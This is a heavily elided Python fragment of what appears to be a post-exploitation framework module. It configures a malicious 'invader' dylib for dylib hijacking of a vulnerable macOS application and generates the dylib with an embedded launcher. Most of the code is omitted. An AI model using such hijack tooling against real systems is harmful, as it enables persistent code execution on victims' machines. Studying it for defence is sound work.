...
class Module:
    ...
    def __init__(self, mainMenu, params=[]):
        ...
        self.info = {
            ...
            'Description': ('Configures and invader dylib for use in a Dylib hijack, given the path to a legitimate dylib of a vulnerable application. The architecture of the dylib must match the target application. The configured dylib will be copied local to the hijackerPath'),
    ...
    def generate(self, obfuscate=False, obfuscationCommand=""):
        ...
        dylibBytes = self.mainMenu.payloads.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
